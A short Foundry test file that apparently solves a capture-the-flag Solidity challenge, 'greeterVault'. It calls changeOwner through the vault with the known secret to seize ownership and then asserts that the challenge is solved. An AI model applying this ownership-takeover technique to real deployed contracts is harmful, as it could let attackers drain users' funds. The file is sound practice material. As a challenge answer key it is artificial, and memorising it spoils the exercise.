// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Vault, SetUp, VaultLogic} from "greeterVault/contracts/greeterVault.sol";

contract greeterVaultTest is Test {
    VaultLogic public logic;
    SetUp public set;
    Vault public vault;

    function setUp() public {
        set = new SetUp(bytes32("lol"));
        logic = VaultLogic(set.logic());
        vault = Vault(set.vault());
    }

    function test_GreeterVaultSolution() public {
        address(vault).call(abi.encodeCall(VaultLogic.changeOwner, (bytes32("lol"),  payable(address(this)))));
        assertTrue(set.isSolved());
    }
}

